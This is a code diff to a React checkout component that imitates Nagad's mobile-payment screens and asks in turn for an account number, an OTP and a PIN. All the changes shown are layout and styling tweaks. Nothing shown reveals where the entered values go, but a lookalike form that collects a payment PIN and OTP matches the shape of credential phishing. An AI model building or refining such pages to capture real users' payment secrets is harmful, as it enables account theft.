@@ -610,8 +610,8 @@ export default function OnlineCheckoutGateway({
             </div>
           </div>
 
-          <form onSubmit={handleNextStep} className="flex flex-col flex-1 justify-between min-h-0">
-            <div>
+          <form onSubmit={handleNextStep} className="flex flex-col flex-1 justify-between min-h-0 h-full">
+            <div className="shrink-0">
               {/* Top Shopping Cart Logo */}
               <div className="py-1 sm:py-2 text-center">
                 <svg viewBox="0 0 120 100" className="w-[85px] h-[65px] sm:w-[110px] sm:h-[85px] mx-auto text-white/95 animate-fadeIn" fill="none" stroke="currentColor" strokeWidth="1.6">
@@ -645,11 +645,14 @@ export default function OnlineCheckoutGateway({
                   <span className="font-bold text-white/95">Charge:</span> <span className="font-normal text-white/90 ml-1">BDT 0</span>
                 </div>
               </div>
+            </div>
 
+            {/* Vertically Centered active steps container */}
+            <div className="flex-1 flex flex-col justify-center items-center min-h-0 py-2">
               {/* STEP 1: PHONE NUMBER */}
               {step === 1 && (
-                <div className="mt-4 sm:mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
-                  <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-2 sm:mb-3 tracking-wide">
+                <div className="flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
+                  <h2 className="text-white text-xs sm:text-sm font-bold mb-2 sm:mb-3 tracking-wide">
                     Your Nagad Account Number
                   </h2>
                   <input
@@ -674,8 +677,8 @@ export default function OnlineCheckoutGateway({
 
               {/* STEP 2: OTP VERIFICATION */}
               {step === 2 && (
-                <div className="mt-4 sm:mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
-                  <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-2 sm:mb-3 tracking-wide">
+                <div className="flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
+                  <h2 className="text-white text-xs sm:text-sm font-bold mb-2 sm:mb-3 tracking-wide">
                     Enter Verification Code [OTP]
                   </h2>
                   <input
@@ -701,8 +704,8 @@ export default function OnlineCheckoutGateway({
 
               {/* STEP 3: PIN ENTRY */}
               {step === 3 && (
-                <div className="mt-4 sm:mt-6 flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
-                  <h2 className="text-white/95 text-xs sm:text-sm font-normal mb-2 sm:mb-3 tracking-wide">
+                <div className="flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
+                  <h2 className="text-white text-xs sm:text-sm font-bold mb-2 sm:mb-3 tracking-wide">
                     Enter PIN
                   </h2>
                   <input
@@ -727,8 +730,8 @@ export default function OnlineCheckoutGateway({
             </div>
 
             {/* Sticky Official Nagad Footer illustration */}
-            <div className="mt-4 sm:mt-8 flex flex-col items-center select-none pb-1 pt-2 sm:pb-2 sm:pt-4 shrink-0">
-              <div className="flex items-center justify-center max-w-[220px] mb-1 sm:mb-2 overflow-hidden">
+            <div className="mt-1 sm:mt-4 flex flex-col items-center select-none pb-4 pt-1 shrink-0 -translate-y-4 sm:translate-y-0">
+              <div className="flex items-center justify-center max-w-[220px] mb-1 overflow-hidden">
                 <img 
                   src={settings?.nagadLogo || "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Nagad_logo.svg/512px-Nagad_logo.svg.png"}
                   alt="Nagad Logo"
